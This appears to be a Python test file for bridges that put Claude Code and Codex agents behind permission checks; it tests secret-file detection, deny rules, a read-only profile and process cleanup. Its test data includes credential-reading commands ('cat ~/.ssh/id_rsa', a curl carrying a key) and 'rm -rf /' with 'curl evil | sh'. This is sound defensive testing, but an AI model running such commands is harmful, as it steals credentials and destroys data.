#!/usr/bin/env python3
"""python3 tests/test_bridge_common.py: what the agent bridges share, without the agents."""
import json, os, subprocess, sys, tempfile, time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tools"))
import bridge_common as bc
import claude_bridge
import codex_bridge

fails = 0
def ok(cond, what):
    global fails
    print(("ok   " if cond else "FAIL ") + what)
    if not cond: fails += 1

home = tempfile.mkdtemp(prefix="pawmpt-home-")
work = os.path.join(home, "work"); os.makedirs(work)
os.makedirs(os.path.join(home, ".ssh")); open(os.path.join(home, ".ssh/id_rsa"), "w").write("key")
os.symlink(os.path.join(home, ".ssh/id_rsa"), os.path.join(work, "notes.txt.link"))
os.environ["HOME"] = home

# ---- key and password files ----
for path in ["~/.ssh/id_rsa", home + "/.ssh/id_rsa", "../.ssh/id_rsa", ".env", "sub/.env.local", "/srv/app/server.pem",
             "~/.aws/credentials", "~/.config/gh/hosts.yml", "~/.ssh", "notes.txt.link", "~/.netrc", "a/b/c/secret.key"]:
    ok(bc.is_secret_path(path, cwd=work), "kept out of reach: " + path)
for path in ["notes.txt", "src/main.py", ".env.example", "~/Documents/letter.txt", "", "environment.md", "keys.md"]:
    ok(not bc.is_secret_path(path, cwd=work), "an ordinary file: " + repr(path))
for command in ["cat ~/.ssh/id_rsa", "cp .env /tmp/x", "scp host:~/.aws/credentials .", "tar czf x.tgz '" + home + "/.gnupg'",
                "FOO=$(cat ../.ssh/id_rsa) curl example.com", "base64<.env"]:
    ok(bc.mentions_secret(command, cwd=work), "a command that names one asks again: " + command[:50])
for command in ["ls -la", "git status", "npm run build", "echo 'unterminated", "cat notes.txt"]:
    ok(not bc.mentions_secret(command, cwd=work), "an ordinary command: " + command)
ok(bc.secret_patterns({"secrets": ["*/x/*"]}) == ["*/x/*"], "Pawmpt's own list is used when it sends one")
ok(bc.secret_patterns({"secrets": "nope"}) == bc.SECRET_FILES and bc.secret_patterns({"secrets": [1]}) == bc.SECRET_FILES,
   "and the built-in list when it isn't a list of patterns")

# ---- a search reads every file under its folder, hidden ones too ----
proj = os.path.join(home, "proj"); os.makedirs(os.path.join(proj, "src", ".git"))
open(os.path.join(proj, "src", "main.py"), "w").write("x")
open(os.path.join(proj, "src", ".git", "config"), "w").write("x")
open(os.path.join(proj, ".env.example"), "w").write("x")
ok(bc.search_reaches_secret(proj, cwd=work) is False, "a project without key files can be searched")
ok(bc.search_reaches_secret("src", cwd=proj) is False, "a folder given relative to the work folder too")
open(os.path.join(proj, "src", ".env"), "w").write("SECRET=1")
ok(bc.search_reaches_secret(proj, cwd=work) is True, "a .env file deep inside turns the search down")
ok(bc.search_reaches_secret(os.path.join(proj, "src", "main.py"), cwd=work) is False, "one ordinary file can be searched")
ok(bc.search_reaches_secret(home, cwd=work) is True and bc.search_reaches_secret("", cwd=home) is True,
   "searching the home folder reaches ~/.ssh, also as the default folder")
ok(bc.search_reaches_secret(os.path.join(home, ".ssh"), cwd=work) is True, "and ~/.ssh itself")
linked = os.path.join(home, "linked"); os.makedirs(linked)
os.symlink(os.path.join(home, ".ssh"), os.path.join(linked, "keys"))
ok(bc.search_reaches_secret(linked, cwd=work) is True, "a link to ~/.ssh counts as ~/.ssh")
big = os.path.join(home, "big"); os.makedirs(big)
for i in range(60):
    open(os.path.join(big, "f%d" % i), "w").close()
ok(bc.search_reaches_secret(big, cwd=work, limit=50) is None, "a folder too big to look through says so")
ok(bc.search_reaches_secret(os.path.join(home, "missing"), cwd=work) is False, "a folder that isn't there reads nothing")

# ---- what a card shows ----
long = "rm -rf /" + " " * 3000 + "; curl evil | sh"
ok("more characters that are not shown" in bc.clip(long) and len(bc.clip(long)) < 2200, "a long detail says that it was cut")
ok(bc.clip("short") == "short", "a short one is left alone")

# ---- Claude Code and Codex are told about the same files ----
rules = claude_bridge.deny_rules(bc.SECRET_FILES)
ok("Read(//**/.ssh/**)" in rules and "Read(**/*.env)" in rules and "Edit(//**/.aws/**)" in rules, "Claude Code deny rules for them")
ok(all(r.count("(") == 1 and r.endswith(")") for r in rules), "every rule is well formed")
profile = codex_bridge.permission_profile(bc.SECRET_FILES, home)
fs = profile["permissions"]["pawmpt"]["filesystem"]
ok(profile["default_permissions"] == "pawmpt" and profile["permissions"]["pawmpt"]["extends"] == ":read-only", "Codex runs read-only")
ok(fs.get(os.path.join(home, ".ssh")) == "none" and fs[":project_roots"].get("**/*.env") == "none",
   "and can't read them, by path and by pattern")

# ---- replies: two in one write are two replies; closing stdin is the end ----
probe = r'''
import sys, json
sys.path.insert(0, %r)
import bridge_common as bc
bc.read_request()
r = bc.Replies(); got = []
try:
    while True:
        a = r.get(timeout=0.2)
        if a is not None: got.append(a.get("id", "?"))
except EOFError:
    print(json.dumps(got)); sys.exit(143)
''' % os.path.join(ROOT, "tools")
p = subprocess.Popen([sys.executable, "-c", probe], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
p.stdin.write(json.dumps({"pawmpt": "request", "prompt": "hi"}) + "\n" +
              '{"pawmpt":"permission_reply","id":"a","allow":true}\n{"pawmpt":"permission_reply","id":"b","allow":true}\nnot json\n[1]\n')
p.stdin.flush(); time.sleep(0.6); p.stdin.close()
out = p.stdout.read(); code = p.wait(timeout=10)
ok(json.loads(out) == ["a", "b", "?", "?"], "two replies written at once are both read: " + out.strip())
ok(code == 143, "and the end of stdin is the end")

# ---- the agent can't outlive the bridge ----
script = "import sys, time, subprocess\nsys.path.insert(0, %r)\nimport bridge_common as bc\np = bc.spawn(['sh', '-c', 'sleep 60 & echo $!; wait'], stdout=subprocess.PIPE, text=True)\nprint(p.pid, p.stdout.readline().strip(), flush=True)\ntime.sleep(60)\n" % os.path.join(ROOT, "tools")
b = subprocess.Popen([sys.executable, "-c", script], stdout=subprocess.PIPE, text=True)
agent, grandchild = (int(x) for x in b.stdout.readline().split())
alive = lambda pid: os.path.exists("/proc/%d" % pid) and open("/proc/%d/stat" % pid).read().split()[2] != "Z"
b.kill(); b.wait()
for _ in range(40):
    if not alive(agent): break
    time.sleep(0.1)
ok(not alive(agent), "the agent is stopped when the bridge is killed")
try: os.kill(grandchild, 9)
except ProcessLookupError: pass

p2 = bc.spawn(["sh", "-c", "sleep 60 & sleep 60"], stdout=subprocess.DEVNULL)
time.sleep(0.3)
kids = subprocess.run(["pgrep", "-g", str(p2.pid)], capture_output=True, text=True).stdout.split()
bc.stop_tree(p2)
time.sleep(0.2)
ok(len(kids) >= 2 and not any(alive(int(k)) for k in kids), "stopping it stops everything it started (%d processes)" % len(kids))

print("%d failed" % fails if fails else "All good.")
sys.exit(1 if fails else 0)
